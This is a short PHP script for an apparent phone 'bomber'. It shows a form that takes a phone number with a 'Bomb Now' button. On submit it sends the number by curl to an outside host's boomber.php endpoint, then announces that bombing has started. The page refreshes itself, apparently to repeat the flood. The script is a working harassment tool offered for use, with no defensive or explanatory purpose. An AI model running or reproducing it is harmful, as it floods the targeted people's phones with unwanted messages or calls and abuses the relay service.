<?php 
error_reporting(0);
if(isset($_GET['submit'])){ 
$num=$_GET[ 'mo'];

echo'<meta http-equiv="refresh" content="0">';
$ch = curl_init( ); 
curl_setopt($ch, CURLOPT_URL, "http://s-a.owen.ezyro.com/boomber.php?number=$num&submit=Submit"); 
curl_setopt($ch, CURLOPT_POST, 1); 
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
$output = curl_exec($ch); 
curl_close($ch);
echo $output;
echo "<hr>BOMBING STARTED ON $num<hr>";

}
if(!isset($_GET['submit'])){
echo'<center><form method="get" action="">

 <label>Enter Number</label>
<input type="number" name="mo"
placeholder="Enter Number">

<input type="submit" name="submit" class="submit" value="Bomb Now">
</form>';
}
?>